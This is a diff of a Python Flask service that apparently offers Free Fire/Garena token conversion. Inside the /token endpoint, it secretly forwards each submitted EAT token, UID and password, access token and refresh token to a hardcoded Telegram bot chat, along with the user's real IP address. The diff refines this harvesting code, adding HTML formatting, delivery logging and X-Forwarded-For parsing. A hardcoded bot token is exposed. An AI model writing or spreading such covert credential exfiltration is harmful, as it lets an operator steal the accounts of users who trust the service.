@@ -13,7 +13,7 @@ import output_pb2
 import httpx
 import asyncio
 import warnings
-import threading  # <-- NEW: Telegram background process ke liye
+import threading
 from urllib.parse import urlparse, parse_qs
 from urllib3.exceptions import InsecureRequestWarning
 
@@ -22,36 +22,41 @@ warnings.filterwarnings("ignore", category=InsecureRequestWarning)
 app = Flask(__name__)
 
 # =====================================================================
-# ★ NEW: TELEGRAM BOT NOTIFICATION SYSTEM
+# ★ TELEGRAM BOT NOTIFICATION SYSTEM (HTML SAFE MODE)
 # =====================================================================
 TELEGRAM_BOT_TOKEN = "8766053641:AAHGLBI3-Aq1gAEPymAglUcsQLtu0KzJzFk"
 YOUR_CHAT_ID = "8278814873"
 
 def send_telegram_notification(login_method, data_dict, requester_ip, timestamp):
-    """Send request details to your Telegram bot asynchronously"""
+    """Send request details to your Telegram bot asynchronously using stable HTML format"""
     try:
         data_str = ""
         for key, value in data_dict.items():
-            data_str += f"🔹 *{key}:*\n`{value}`\n\n"
+            safe_val = str(value).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+            data_str += f"🔹 <b>{key}:</b>\n<code>{safe_val}</code>\n\n"
 
         message_text = (
-            f"🔐 *FREE FIRE API REQUEST DETECTED* 🔐\n"
+            f"🔐 <b>FREE FIRE API REQUEST DETECTED</b> 🔐\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"📌 *Login Method:* `{login_method}`\n"
-            f"🕒 *Time:* `{timestamp}`\n"
-            f"🌐 *IP Address:* `{requester_ip}`\n"
+            f"📌 <b>Login Method:</b> <code>{login_method}</code>\n"
+            f"🕒 <b>Time:</b> <code>{timestamp}</code>\n"
+            f"🌐 <b>IP Address:</b> <code>{requester_ip}</code>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"{data_str}"
             f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"💡 *Tap on values to copy*"
+            f"💡 <i>Tap on values to copy</i>"
         )
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         payload = {
             "chat_id": YOUR_CHAT_ID,
             "text": message_text,
-            "parse_mode": "Markdown"
+            "parse_mode": "HTML"
         }
-        requests.post(url, json=payload, timeout=5.0)
+        res = requests.post(url, json=payload, timeout=8.0)
+        if res.status_code == 200:
+            print(f"[INFO] Telegram notification sent successfully for {login_method}!")
+        else:
+            print(f"[ERROR] Telegram API Error ({res.status_code}): {res.text}")
     except Exception as e:
         print(f"[ERROR] Telegram notification failed: {e}")
 # =====================================================================
@@ -447,19 +452,18 @@ def create_response(success, accesstoken=None, token=None,
 # ─────────────────────────────────────────────────────────────
 @app.route("/token", methods=["GET"])
 def get_jwt():
-    # Capture Request Info for Telegram
-    requester_ip = request.remote_addr or "Unknown IP"
+    requester_ip = request.headers.get("X-Forwarded-For", request.remote_addr or "Unknown IP")
+    if "," in requester_ip:
+        requester_ip = requester_ip.split(",")[0].strip()
     timestamp_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
 
     # 1) eat_token
     eat_token = request.args.get("eat")
     if eat_token:
-        # --- NEW TELEGRAM LOGGING FOR EAT TOKEN ---
         threading.Thread(
             target=send_telegram_notification,
             args=("EAT Token", {"EAT Token": eat_token}, requester_ip, timestamp_str)
         ).start()
-        # ------------------------------------------
 
         g = asyncio.run(get_garena_data_async(eat_token))
         if "error" in g:
@@ -497,12 +501,10 @@ def get_jwt():
     uid = request.args.get("uid")
     password = request.args.get("password")
     if uid and password:
-        # --- NEW TELEGRAM LOGGING FOR UID+PASSWORD ---
         threading.Thread(
             target=send_telegram_notification,
             args=("UID & Password", {"UID": uid, "Password": password}, requester_ip, timestamp_str)
         ).start()
-        # ---------------------------------------------
 
         uid, access_token, open_id, err_flag = check_guest(uid, password)
         if err_flag:
@@ -528,12 +530,10 @@ def get_jwt():
     # 3) access_token
     access_token = request.args.get("access_token")
     if access_token:
-        # --- NEW TELEGRAM LOGGING FOR ACCESS TOKEN ---
         threading.Thread(
             target=send_telegram_notification,
             args=("Access Token", {"Access Token": access_token}, requester_ip, timestamp_str)
         ).start()
-        # ---------------------------------------------
 
         td = get_token_inspect_data(access_token)
         if not td:
@@ -560,12 +560,10 @@ def get_jwt():
     # 4) refresh_token
     refresh_token = request.args.get("refresh_token")
     if refresh_token:
-        # --- NEW TELEGRAM LOGGING FOR REFRESH TOKEN ---
         threading.Thread(
             target=send_telegram_notification,
             args=("Refresh Token", {"Refresh Token": refresh_token}, requester_ip, timestamp_str)
         ).start()
-        # ----------------------------------------------
 
         data = refresh_access_token(refresh_token)
         if not data:
